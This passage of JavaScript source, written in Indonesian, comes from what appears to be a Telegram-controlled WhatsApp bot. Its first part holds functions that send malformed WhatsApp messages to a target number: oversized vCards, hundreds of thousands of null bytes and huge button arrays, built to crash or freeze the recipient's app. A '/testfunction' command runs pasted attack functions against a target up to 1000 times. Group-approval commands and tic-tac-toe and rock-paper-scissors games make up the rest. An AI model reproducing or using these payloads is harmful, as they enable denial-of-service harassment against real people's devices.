    "vcard": `BEGIN:VCARD\nVERSION:3.0\nN:;🌺${"𑇂𑆵𑆴𑆿".repeat(10000)};;;\nFN:🌺${"𑇂𑆵𑆴𑆿".repeat(10000)}\nNICKNAME:  — Fadzx Lagii Sedihh  ${"ᩫᩫ".repeat(4000)}\nORG:🌺${"ᩫᩫ".repeat(4000)}\nTITLE:  — Fadzx Lagii Sedihh  ${"ᩫᩫ".repeat(4000)}\nitem1.TEL;waid=6287873499996:+62 878-7349-9996\nitem1.X-ABLabel:Telepon\nitem2.EMAIL;type=INTERNET:🌺${"ᩫᩫ".repeat(4000)}\nitem2.X-ABLabel:Kantor\nitem3.EMAIL;type=INTERNET:🌺${"ᩫᩫ".repeat(4000)}\nitem3.X-ABLabel:Kantor\nitem4.EMAIL;type=INTERNET:🌺${"ᩫᩫ".repeat(4000)}\nitem4.X-ABLabel:Pribadi\nitem5.ADR:;;🌺${"ᩫᩫ".repeat(4000)};;;;\nitem5.X-ABADR:ac\nitem5.X-ABLabel:Rumah\nX-YAHOO;type=KANTOR:🌺${"ᩫᩫ".repeat(4000)}\nPHOTO;BASE64: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\nX-WA-BIZ-NAME:  — Fadzx Lagii Sedihh  ${"ᩫᩫ".repeat(4000)}\nEND:VCARD`,
  "contextInfo": {
     "participant": "status@broadcast",
        "externalAdReply": {
           "automatedGreetingMessageShown": true,
           "automatedGreetingMessageCtaType": "\u0000".repeat(100000),
           "greetingMessageBody": "\u0000"
        }
      }
    }
  }, {
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {
        status_setting: "allowlist"
      },
      content: [
        {
          tag: "mentioned_users",
          attrs: {},
          content: [
            {
              tag: "to",
              attrs: {
                jid: target
              }
            }
          ]
        }
      ]
    }]
  })
}
//------------------(FUNG BEBAS SPAM)--------------------//
async function diley(sock, target) {
    const msg = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "X-hunter Is HereC‌⃰ꪸ⃟",
                        format: "DEFAULT"
                    },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 500000 }, () => ({
                        }))
                    },
                    viewOnceMessage: {
                        message: {
                            imageMessage: {
                                url: "https://files.catbox.moe/rv38u5.jpg",
                                mimetype: "image/jpeg",
                                caption: "mampir",
                                fileLength: "11887",
                                height: 1080,
                                width: 1080
                            }
                        }
                    },
                    extendedTextMessage: {
                        text: "X-hunter Is HereC‌⃰ꪸ⃟",
                        title: "\u0000".repeat(300000),
                        description: "\u3164".repeat(300000),
                        previewType: "NONE"
                    }
                }
            }
        }
    };

    await sock.relayMessage(target, msg, { participant: { jid: target } });
}

async function MantanNyLebihBgus(sock, target) {
try {
const msg = {
groupStatusMessageV2: {
message: {
nteractiveResponseMessage: {
body: {
text: "✔ - Mantan Nya Lebih Bagus",
title: "\u0000".repeat(200000),
format: "DEFAULT",
},
nativeFlowResponseMessage: {
name: "call_permission_request",
paramsJson: "\u0000".repeat(1000000),
version: 3,
}
} 
}
}
};
const msg2 = {
groupStatusMessageV2: {
message: {
interactiveMessage: {
body: {
text: "✔ - Mantan Nya Lebih Bagus" + "\u200b".repeat(250000)
},
footer: {
text: "✔ - Mantan Nya Lebih Bagus"
},
nativeFlowMessage: {
buttons: [
{
name: "cta_url",
buttonParamsJson: JSON.stringify({
display_text: "OK",
url: "https://t.me/FadzxGanteng"
})
}
]
}
}
}
}
};
const msg3 = {
interactiveMessage: {
body: {
text: "✔ - Mantan Nya Lebih Bagus"
},
nativeFlowMessage: {
buttons: "\u3164".repeat(500000)
}
}
};
const msg4 = {
groupStatusMessageV2: {
message: {
interactiveMessage: {
header: {
title: "✔ - Mantan Nya Lebih Bagus"
},
body: {
text: "\0"
},
nativeFlowMessage: {
buttons: "\0".repeat(500000)
}
}
}
}
};
const msg5 = {
groupStatusMessageV2: {
message: {
interactiveMessage: {
body: {
text: "✔ - Mantan Nya Lebih Bagus" + "\n"
},
nativeFlowMessage: {
messageParamsJson: "[".repeat(15000),
buttons: [
{
name: "\u0000".repeat(260000) + "\x10".repeat(260000),
buttonParamsJson: "{}"
}
]
}
}
}
}
};

await sock.relayMessage(target, msg, {});
await sock.relayMessage(target, msg2, {});
await sock.relayMessage(target, msg3, {});
await sock.relayMessage(target, msg4, {});
await sock.relayMessage(target, msg5, {});
console.log("Success Sending Mantan Nya Lebih Baik To Target");
} catch (e) {
console.error("Error When Sending Mantan Nya Lebih Baik To Target:", error);
}
}
//------------------(AKHIR OF FUNCTION)--------------------//
bot.command("approved", async (ctx) => {
  if (!isOwner(ctx.from.id)) {
    return ctx.reply("❌ Hanya owner yang bisa approve group.");
  }

  const args = ctx.message.text.split(" ").slice(1);
  const chatId = args[0];

  if (!chatId) {
    return ctx.reply("🪧 Format: /approved -100xxxxxxxxxx");
  }

  if (isGroupApproved(chatId)) {
    return ctx.reply("⚠️ Group ini sudah di-approve.");
  }

  approvedGroups.push(String(chatId));
  saveApprovedGroups();

  if (pendingGroups.has(String(chatId))) {
    clearTimeout(pendingGroups.get(String(chatId)).timeout);
    pendingGroups.delete(String(chatId));
  }

  try {
    await ctx.telegram.sendMessage(
      chatId,
      "✅ Group ini telah di-approve oleh owner. Bot sekarang aktif di sini."
    );
  } catch (e) {}

  return ctx.reply(`✅ Group ${chatId} berhasil di-approve.`);
});

bot.command("unapproved", async (ctx) => {
  if (!isOwner(ctx.from.id)) {
    return ctx.reply("❌ Hanya owner yang bisa mencabut approve.");
  }

  const args = ctx.message.text.split(" ").slice(1);
  const chatId = args[0];

  if (!chatId) {
    return ctx.reply("🪧 Format: /unapproved -100xxxxxxxxxx");
  }

  if (!isGroupApproved(chatId)) {
    return ctx.reply("⚠️ Group ini belum di-approve.");
  }

  approvedGroups = approvedGroups.filter((id) => id !== String(chatId));
  saveApprovedGroups();

  try {
    await ctx.telegram.sendMessage(
      chatId,
      "⚠️ Approval group ini dicabut oleh owner. Bot akan nonaktif di sini."
    );
  } catch (e) {}

  return ctx.reply(`✅ Approval group ${chatId} berhasil dicabut.`);
});

bot.command("listapprovedgroup", async (ctx) => {
  if (!isOwner(ctx.from.id)) {
    return ctx.reply("❌ Hanya owner yang bisa melihat daftar.");
  }

  if (approvedGroups.length === 0) {
    return ctx.reply("📭 Belum ada group yang di-approve.");
  }

  const text = approvedGroups.map((id, i) => `${i + 1}. ${id}`).join("\n");
  return ctx.reply(`📋 Daftar group approved:\n\n${text}`);
});

bot.command("blockcmd", async (ctx) => {
  if (String(ctx.from.id) !== String(ownerID)) {
    return ctx.reply("❌ Akses ditolak.");
  }

  const args = ctx.message.text.split(" ").slice(1);
  const commandName = normalizeCommandName(args[0]);

  if (!commandName) {
    return ctx.reply("🪧 Format: /blockcmd namacommand");
  }

  if (["blockcmd", "unblockcmd", "listblockcmd"].includes(commandName)) {
    return ctx.reply("❌ Command ini tidak bisa diblokir.");
  }

  if (blockedCommands.includes(commandName)) {
    return ctx.reply(`⚠️ Command /${commandName} sudah diblokir.`);
  }

  blockedCommands.push(commandName);
  saveBlockedCommands();

  return ctx.reply(`✅ Command /${commandName} berhasil diblokir.`);
});

bot.command("unblockcmd", async (ctx) => {
  if (String(ctx.from.id) !== String(ownerID)) {
    return ctx.reply("❌ Akses ditolak.");
  }

  const args = ctx.message.text.split(" ").slice(1);
  const commandName = normalizeCommandName(args[0]);

  if (!commandName) {
    return ctx.reply("🪧 Format: /unblockcmd namacommand");
  }

  if (!blockedCommands.includes(commandName)) {
    return ctx.reply(`⚠️ Command /${commandName} tidak sedang diblokir.`);
  }

  blockedCommands = blockedCommands.filter(cmd => cmd !== commandName);
  saveBlockedCommands();

  return ctx.reply(`✅ Command /${commandName} berhasil dibuka kembali.`);
});

bot.command("listblockcmd", async (ctx) => {
  if (String(ctx.from.id) !== String(ownerID)) {
    return ctx.reply("❌ Akses ditolak.");
  }

  if (blockedCommands.length === 0) {
    return ctx.reply("✅ Tidak ada command yang sedang diblokir.");
  }

  const list = blockedCommands.map((cmd, i) => `${i + 1}. /${cmd}`).join("\n");

  return ctx.reply(
    `📋 Daftar command yang diblokir:\n\n${list}`
  );
});

// ================================
// COMMAND: ADD PREMIUM GROUP
// /addpremgrup
// ================================
bot.command("addpremgrup", ownerOnly(), async (ctx) => {
  const type = ctx.chat?.type;
  if (type === "private") return ctx.reply("❌ Pakai command ini di grup.");

  addPremGroup(ctx.chat.id);

  const title = escapeHtml(ctx.chat?.title || "Unknown Group");
  return ctx.reply(
    `✅ ☇ <b>${title}</b> berhasil ditambahkan sebagai Group premium`,
    { parse_mode: "HTML" }
  );
});

// ================================
// COMMAND: DELETE PREMIUM GROUP
// /delpremgrup
// ================================
bot.command("delpremgrup", ownerOnly(), async (ctx) => {
  const type = ctx.chat?.type;
  if (type === "private") return ctx.reply("❌ Pakai command ini di grup.");

  delPremGroup(ctx.chat.id);

  const title = escapeHtml(ctx.chat?.title || "Unknown Group");
  return ctx.reply(
    `🗑 ☇ <b>${title}</b> berhasil dihapus sebagai group premium sampai`,
    { parse_mode: "HTML" }
  );
});

// ================================
// COMMAND: LIST PREMIUM GROUP
// /listpremgrup
// ================================
bot.command("listpremgrup", ownerOnly(), async (ctx) => {
  const db = loadPremGroups();
  if (!db.groups.length) return ctx.reply("📭 Tidak ada grup premium.");

  const lines = db.groups.map((id, i) => `${i + 1}. <code>${id}</code>`).join("\n");
  return ctx.reply(`📌 <b>LIST GRUP PREMIUM</b>\n\n${lines}`, { parse_mode: "HTML" });
});

bot.command("testfunction", checkCooldown, checkWhatsAppConnection, async (ctx) => {
    try {
      const args = ctx.message.text.split(" ")
      if (args.length < 3)
        return ctx.reply("🪧 ☇ Format: /testfunction 62××× 10 (reply function)")

      const q = args[1]
      const jumlah = Math.max(0, Math.min(parseInt(args[2]) || 1, 1000))
      if (isNaN(jumlah) || jumlah <= 0)
        return ctx.reply("❌ ☇ Jumlah harus angka")

      const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
      if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.text)
        return ctx.reply("❌ ☇ Reply dengan function")

      const processMsg = await ctx.telegram.sendPhoto(
        ctx.chat.id,
        { url: vidthumbnail },
        {
          caption: `<blockquote><pre>⬡═―—⊱ ⎧ 𝐏͜𝐎͢𝐒͡𝐄͜𝐈͢𝐃͡𝐎͜𝐍⍣᳟꙰⟅༑𝐈͜𝐍͢𝐅͡𝐈͜𝐍͢𝐈͡𝐓͜𝐄 ⎭ ⊰―—═⬡</pre></blockquote>
ﾒ.- Target: ${q}
ﾒ.- Type: Unknown Function
ﾒ.- Status: Process`,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{ text: "⌜ ﾒ ⌟ ☇ 𝐂𝐇𝐀𝐓 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }]
            ]
          }
        }
      )
      const processMessageId = processMsg.message_id

      const safeSock = createSafeSock(sock)
      const funcCode = ctx.message.reply_to_message.text
      const match = funcCode.match(/async function\s+(\w+)/)
      if (!match) return ctx.reply("❌ ☇ Function tidak valid")
      const funcName = match[1]

      const sandbox = {
        console,
        Buffer,
        sock: safeSock,
        target,
        sleep,
        generateWAMessageFromContent,
        generateForwardMessageContent,
        generateWAMessage,
        prepareWAMessageMedia,
        proto,
        jidDecode,
        areJidsSameUser
      }
      const context = vm.createContext(sandbox)

      const wrapper = `${funcCode}\n${funcName}`
      const fn = vm.runInContext(wrapper, context)

      for (let i = 0; i < jumlah; i++) {
        try {
          const arity = fn.length
          if (arity === 1) {
            await fn(target)
          } else if (arity === 2) {
            await fn(safeSock, target)
          } else {
            await fn(safeSock, target, true)
          }
        } catch (err) {}
        await sleep(200)
      }

      const finalText = `<blockquote><pre>⬡═―—⊱ ⎧ 𝐏͜𝐎͢𝐒͡𝐄͜𝐈͢𝐃͡𝐎͜𝐍⍣᳟꙰⟅༑𝐈͜𝐍͢𝐅͡𝐈͜𝐍͢𝐈͡𝐓͜𝐄 ⎭ ⊰―—═⬡</pre></blockquote>
ﾒ.- Target: ${q}
ﾒ.- Type: Unknown Function
ﾒ.- Status: Success`
      try {
        await ctx.telegram.editMessageCaption(
          ctx.chat.id,
          processMessageId,
          undefined,
          finalText,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "⌜ ﾒ ⌟ ☇ 𝐂𝐇𝐀𝐓 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }]
              ]
            }
          }
        )
      } catch (e) {
        await ctx.replyWithPhoto(
          { url: vidthumbnail },
          {
            caption: finalText,
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "⌜ ﾒ ⌟ ☇ 𝐂𝐇𝐀𝐓 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }]
              ]
            }
          }
        )
      }
    } catch (err) {}
  }
)

// ================================
// COMMAND: /ttt
// ================================
bot.command("ttt", async (ctx) => {
  if (!ctx.chat || (ctx.chat.type !== "group" && ctx.chat.type !== "supergroup")) {
    return ctx.reply("❌ Game ini hanya bisa dimainkan di grup.");
  }

  const chatId = ctx.chat.id;

  if (tttGames.has(chatId)) {
    return ctx.reply("⚠️ Sudah ada game Tic Tac Toe yang berjalan di grup ini.");
  }

  const gameId = Date.now().toString().slice(-6);

  const game = {
    id: gameId,
    board: tttNewBoard(),
    players: {
      X: ctx.from,
      O: null
    },
    turn: "X",
    messageId: null,
    started: false
  };

  tttGames.set(chatId, game);

  const sent = await ctx.reply( `<blockquote>
🎮 𝐓𝐈𝐂 𝐓𝐀𝐂 𝐓𝐎𝐄 𝐆𝐀𝐌𝐄 🎮

❌ X : <b>${tttSafeName(ctx.from)}</b>
⭕ O : <b>Belum join</b>

<i>Klik tombol di bawah untuk join sebagai O</i>
</blockquote>`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "⭕ Join Game", callback_data: `tttjoin_${chatId}_${gameId}` }]
        ]
      }
    }
  );

  game.messageId = sent.message_id;
});

// ================================
// COMMAND: /tttstop
// ================================
bot.command("tttstop", async (ctx) => {
  const chatId = ctx.chat.id;

  if (!tttGames.has(chatId)) {
    return ctx.reply("❌ Tidak ada game Tic Tac Toe yang sedang berjalan.");
  }

  tttGames.delete(chatId);
  return ctx.reply("🛑 Game Tic Tac Toe dihentikan.");
});

// ================================
// COMMAND: /mypoint
// ================================
bot.command("mypoint", async (ctx) => {
  const row = getUserPoint(ctx.from.id);
  if (!row) {
    return ctx.reply("📌 Kamu belum punya point.");
  }

  return ctx.reply( `<blockquote>
🏅 𝐌𝐘 𝐏𝐎𝐈𝐍𝐓 🏅

👤 <b>${row.name}</b>
⭐ Point: <b>${row.points}</b>

🏆 Win: <b>${row.win}</b>
🤝 Draw: <b>${row.draw}</b>
💀 Lose: <b>${row.lose}</b>
</blockquote>`,
    { parse_mode: "HTML" }
  );
});

// ================================
// COMMAND: /leaderboard
// ================================
bot.command("leaderboard", async (ctx) => {
  const top = getLeaderboard(10);

  if (!top.length) {
    return ctx.reply("📌 Leaderboard masih kosong.");
  }

  let text = `🏆 <b>LEADERBOARD TIC TAC TOE</b>\n\n`;
  top.forEach((u, i) => {
    text += `${i + 1}. <b>${u.name}</b> — ⭐ <b>${u.points}</b> (W:${u.win} D:${u.draw} L:${u.lose})\n`;
  });

  return ctx.reply(text, { parse_mode: "HTML" });
});

// ================================
// JOIN GAME
// ================================
bot.action(/^tttjoin_(.+)_(.+)$/, async (ctx) => {
  try {
    const chatId = Number(ctx.match[1]);
    const gameId = String(ctx.match[2]);
    const game = tttGames.get(chatId);

    if (!game || game.id !== gameId) {
      return ctx.answerCbQuery("❌ Game tidak ditemukan", { show_alert: true });
    }

    if (game.players.O) {
      return ctx.answerCbQuery("⚠️ Slot O sudah diisi", { show_alert: true });
    }

    if (game.players.X.id === ctx.from.id) {
      return ctx.answerCbQuery("❌ Kamu sudah jadi player X", { show_alert: true });
    }

    game.players.O = ctx.from;
    game.started = true;

    await ctx.editMessageText(tttRender(game), {
      parse_mode: "HTML",
      reply_markup: tttBoardKeyboard(chatId, gameId, game.board)
    });

    return ctx.answerCbQuery("✅ Kamu join sebagai O");
  } catch {
    return ctx.answerCbQuery("❌ Error");
  }
});

// ================================
// MOVE
// ================================
bot.action(/^tttmove_(.+)_(.+)_(\d+)$/, async (ctx) => {
  try {
    const chatId = Number(ctx.match[1]);
    const gameId = String(ctx.match[2]);
    const index = Number(ctx.match[3]);

    const game = tttGames.get(chatId);
    if (!game || game.id !== gameId) {
      return ctx.answerCbQuery("❌ Game tidak ditemukan", { show_alert: true });
    }

    if (!game.started) {
      return ctx.answerCbQuery("⚠️ Game belum dimulai", { show_alert: true });
    }

    const currentPlayer = game.turn === "X" ? game.players.X : game.players.O;
    if (!currentPlayer || currentPlayer.id !== ctx.from.id) {
      return ctx.answerCbQuery("❌ Bukan giliran kamu", { show_alert: true });
    }

    if (game.board[index] !== null) {
      return ctx.answerCbQuery("⚠️ Kotak ini sudah terisi", { show_alert: true });
    }

    game.board[index] = game.turn;

    const winner = tttWinner(game.board);

    if (winner) {
      const winnerUser = winner === "X" ? game.players.X : game.players.O;
      const loserUser = winner === "X" ? game.players.O : game.players.X;

      addWinPoint(winnerUser);
      addLosePoint(loserUser);

      await ctx.editMessageText( `<blockquote>
🏆 𝐓𝐈𝐂 𝐓𝐀𝐂 𝐓𝐎𝐄 𝐒𝐄𝐋𝐄𝐒𝐀𝐈 🏆

<i>🏅 Pemenang:</i>
<b>${tttSafeName(winnerUser)}</b> (${winner})

⭐ +3 point untuk pemenang
</blockquote>`,
        {
          parse_mode: "HTML",
          reply_markup: tttBoardKeyboard(chatId, gameId, game.board, true)
        }
      );

      tttGames.delete(chatId);
      return ctx.answerCbQuery("🏆 Menang!");
    }

    if (tttDraw(game.board)) {
      addDrawPoint(game.players.X);
      addDrawPoint(game.players.O);

      await ctx.editMessageText( `<blockquote>
🤝 𝐓𝐈𝐂 𝐓𝐀𝐂 𝐓𝐎𝐄 𝐒𝐄𝐋𝐄𝐒𝐀𝐈 🤝

<i>📜 Hasil:</i>
<b>SERI</b>

⭐ +1 point untuk kedua pemain
</blockquote>`,
        {
          parse_mode: "HTML",
          reply_markup: tttBoardKeyboard(chatId, gameId, game.board, true)
        }
      );

      tttGames.delete(chatId);
      return ctx.answerCbQuery("🤝 Seri");
    }

    game.turn = game.turn === "X" ? "O" : "X";

    await ctx.editMessageText(tttRender(game), {
      parse_mode: "HTML",
      reply_markup: tttBoardKeyboard(chatId, gameId, game.board)
    });

    return ctx.answerCbQuery("✅ Langkah diterima");
  } catch {
    return ctx.answerCbQuery("❌ Error");
  }
});

// ================================
// NOOP
// ================================
bot.action(/^tttnoop_(.+)_(.+)$/, async (ctx) => {
  return ctx.answerCbQuery("⚠️ Game sudah selesai");
});

// ================================
// /suit
// ================================
bot.command("suit", async (ctx) => {
  if (!ctx.chat || (ctx.chat.type !== "group" && ctx.chat.type !== "supergroup")) {
    return ctx.reply("❌ Game ini hanya bisa dimainkan di grup.");
  }

  const chatId = ctx.chat.id;

  if (suitGames.has(chatId)) {
    return ctx.reply("⚠️ Sudah ada game Suit yang berjalan di grup ini.");
  }

  const gameId = Date.now().toString().slice(-6);

  const game = {
    id: gameId,
    p1: ctx.from,
    p2: null,
    p1Choice: null,
    p2Choice: null,
    started: false,
    messageId: null
  };

  suitGames.set(chatId, game);

  const sent = await ctx.reply( `<blockquote>
🎮 𝐒𝐔𝐈𝐓 𝐏𝐕𝐏 𝐆𝐀𝐌𝐄 🎮

👤 Player 1: <b>${suitName(ctx.from)}</b>
👤 Player 2: <b>Belum join</b>

<i>Klik tombol di bawah untuk join game.</i>
</blockquote>`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "⚔️ Join Suit", callback_data: `suitjoin_${chatId}_${gameId}` }]
        ]
      }
    }
  );

  game.messageId = sent.message_id;
});

// ================================
// /suitstop
// ================================
bot.command("suitstop", async (ctx) => {
  const chatId = ctx.chat.id;

  if (!suitGames.has(chatId)) {
    return ctx.reply("❌ Tidak ada game Suit yang berjalan.");
  }

  suitGames.delete(chatId);
  return ctx.reply("🛑 Game Suit dibatalkan.");
});

// ================================
// JOIN
// ================================
bot.action(/^suitjoin_(.+)_(.+)$/, async (ctx) => {
  try {
    const chatId = Number(ctx.match[1]);
    const gameId = String(ctx.match[2]);
    const game = suitGames.get(chatId);

    if (!game || game.id !== gameId) {
      return ctx.answerCbQuery("❌ Game tidak ditemukan", { show_alert: true });
    }

    if (game.p2) {
      return ctx.answerCbQuery("⚠️ Player 2 sudah ada", { show_alert: true });
    }

    if (game.p1.id === ctx.from.id) {
      return ctx.answerCbQuery("❌ Kamu sudah jadi player 1", { show_alert: true });
    }

    game.p2 = ctx.from;
    game.started = true;

    await ctx.editMessageText( `<blockquote>
🎮 𝐒𝐔𝐈𝐓 𝐏𝐕𝐏 𝐆𝐀𝐌𝐄 🎮

👤 Player 1: <b>${suitName(game.p1)}</b>
👤 Player 2: <b>${suitName(game.p2)}</b>

Silakan masing-masing pilih:
<i>(klik tombol, pilihan hanya terlihat oleh sistem)</i>
</blockquote>`,
      {
        parse_mode: "HTML",
        reply_markup: suitPickKeyboard(chatId, gameId)
      }
    );

    return ctx.answerCbQuery("✅ Kamu join sebagai player 2");
  } catch {
    return ctx.answerCbQuery("❌ Error");
  }
});

// ================================
// PICK
// ================================
bot.action(/^suitpick_(.+)_(.+)_(rock|paper|scissors)$/, async (ctx) => {
  try {
    const chatId = Number(ctx.match[1]);
    const gameId = String(ctx.match[2]);
    const choice = String(ctx.match[3]);

    const game = suitGames.get(chatId);
    if (!game || game.id !== gameId) {
      return ctx.answerCbQuery("❌ Game tidak ditemukan", { show_alert: true });
    }

    if (!game.started || !game.p2) {
      return ctx.answerCbQuery("⚠️ Game belum siap", { show_alert: true });
    }

    if (ctx.from.id === game.p1.id) {
      if (game.p1Choice) return ctx.answerCbQuery("⚠️ Kamu sudah memilih", { show_alert: true });
      game.p1Choice = choice;
      await ctx.answerCbQuery(`✅ Pilihan kamu: ${suitChoiceLabel(choice)}`, { show_alert: true });
    } else if (ctx.from.id === game.p2.id) {
      if (game.p2Choice) return ctx.answerCbQuery("⚠️ Kamu sudah memilih", { show_alert: true });
      game.p2Choice = choice;
      await ctx.answerCbQuery(`✅ Pilihan kamu: ${suitChoiceLabel(choice)}`, { show_alert: true });
    } else {
      return ctx.answerCbQuery("❌ Kamu bukan player game ini", { show_alert: true });
    }

    if (!game.p1Choice || !game.p2Choice) {
      const p1Done = game.p1Choice ? "✅" : "⌛";
      const p2Done = game.p2Choice ? "✅" : "⌛";

      await ctx.editMessageText( `<blockquote>
🎮 𝐒𝐔𝐈𝐓 𝐏𝐕𝐏 𝐆𝐀𝐌𝐄 🎮

👤 ${suitName(game.p1)} ${p1Done}
👤 ${suitName(game.p2)} ${p2Done}

<i>Menunggu kedua pemain memilih...</i>
</blockquote>`,
        {
          parse_mode: "HTML",
          reply_markup: suitPickKeyboard(chatId, gameId)
        }
      ).catch(() => {});

      return;
    }

    // hasil
    const result = suitWin(game.p1Choice, game.p2Choice);

    if (result === "draw") {
      addSuitDraw(game.p1);
      addSuitDraw(game.p2);

      await ctx.editMessageText( `<blockquote>
🤝 𝐒𝐔𝐈𝐓 𝐒𝐄𝐋𝐄𝐒𝐀𝐈 🤝

👤 ${suitName(game.p1)} = ${suitChoiceLabel(game.p1Choice)}
👤 ${suitName(game.p2)} = ${suitChoiceLabel(game.p2Choice)}

Hasil: <b>SERI</b>
</blockquote>`,
        { parse_mode: "HTML" }
      );

      suitGames.delete(chatId);
      return;
    }

    const winner = result === "p1" ? game.p1 : game.p2;
    const loser = result === "p1" ? game.p2 : game.p1;

    addSuitWin(winner);
    addSuitLose(loser);

    await ctx.editMessageText( `<blockquote>
🏆 𝐒𝐔𝐈𝐓 𝐒𝐄𝐋𝐄𝐒𝐀𝐈 🏆

👤 ${suitName(game.p1)} = ${suitChoiceLabel(game.p1Choice)}
👤 ${suitName(game.p2)} = ${suitChoiceLabel(game.p2Choice)}

<i>Pemenang:</i>
<b>${suitName(winner)}</b>

⭐ +2 point
</blockquote>`,
      { parse_mode: "HTML" }
    );

    suitGames.delete(chatId);
